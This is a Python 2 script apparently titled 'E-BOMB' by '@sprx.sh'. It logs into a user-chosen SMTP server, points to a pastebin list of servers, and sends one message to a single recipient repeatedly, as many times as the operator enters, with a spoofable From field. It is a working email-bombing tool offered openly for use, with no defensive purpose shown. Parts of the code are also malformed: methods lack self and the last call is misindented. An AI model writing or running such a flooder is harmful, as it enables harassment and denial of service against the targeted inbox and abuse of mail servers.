#!/usr/bin/env python
# -*- coding: utf-8 -*-
import smtplib
import random, string
from time import sleep
from subprocess import call
import sys, platform, subprocess, socket, time, os, urllib,  random, string, urllib2
import mimetypes
import sys
import time
from email.MIMEText import MIMEText
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   WHITE = '\033[37m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   COREGREEN = '\033[1;35;32m'
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
CG = '\033[1;35;32m' # magenta



			####################################################
			#		Creator: @sprx.sh						   #
			#		Do not leech this code, learn from it.	   #
			#		Sources: google.com for MIME and Colors :) #
			####################################################


class EBOMB(object):
      def start(self):
      	os.system("clear")
        print	(color.CYAN + '''
	███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
	██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
	█████╗█████╗██████╔╝██║   ██║██╔████╔██║██████╔╝
	██╔══╝╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
	███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
	╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
		By: @sprx.sh | <3
		''' + color.END)
 
      def SMTP(connect):
            print (color.RED + color.BOLD + "SMTP Server List: https://pastebin.com/zfB0ENzy" + color.END)
            print (color.WHITE + color.BOLD + "=-=-=-=-=-=-=-=|Connection/Login|=-=-=-=-=-=-=-=" + color.BOLD + color.COREGREEN)
            time.sleep(2)
            connect.smtpserver=raw_input("\nSMTP server: ")
            connect.smtpport=input("Enter Port: ")
            try:
                  connect.mailServer = smtplib.SMTP(connect.smtpserver,connect.smtpport)
            except IOError, e:
                  print 'Error: %s' %(e)
                  time.sleep(5)
                  sys.exit(1)
            connect.mailServer.starttls()
            connect.name=raw_input("Email/Username: ")
            connect.password=raw_input("Password: ")
            try:
                  connect.mailServer.login(connect.name,connect.password)
            except BaseException, e:
                  print 'Error: %s' % (e)
                  time.sleep(3)
                  sys.exit(1)
      def typeemail(bomb):
            print (color.WHITE + "\n=-=-=-=-=-=-=-=|Writing the Email|=-=-=-=-=-=-=-=" + color.BOLD + color.COREGREEN)
            print "Fill out the Email <3"
            print (color.RED + "Example: " + color.WHITE + color.UNDERLINE + "name@service.com" + color.END + color.COREGREEN)
            bomb.From = raw_input("\nFrom: ")
            bomb.Receiver = raw_input("To: ")
            bomb.Subject = raw_input("Subject: ")
            bomb.Message = raw_input("Message: ")
            email = MIMEText(bomb.Message)
            email['From']=bomb.From
            email['To']=bomb.Receiver
            email['Subject']=bomb.Subject
            bomb.amount = input(color.CYAN + "\nAmount: ")
            x = 0
            while x < bomb.amount:
                  bomb.mailServer.sendmail(bomb.From, bomb.Receiver, email.as_string())
                  x+=1
            print "Sent %d messages to %s" %(bomb.amount,bomb.Receiver)
            time.sleep(2)
            print "Email(s) Sent!\n"
            print "Instagram: @sprx.sh"
if __name__ == '__main__':
      s = EBOMB()
      s.start()
      s.SMTP()
s.typeemail()
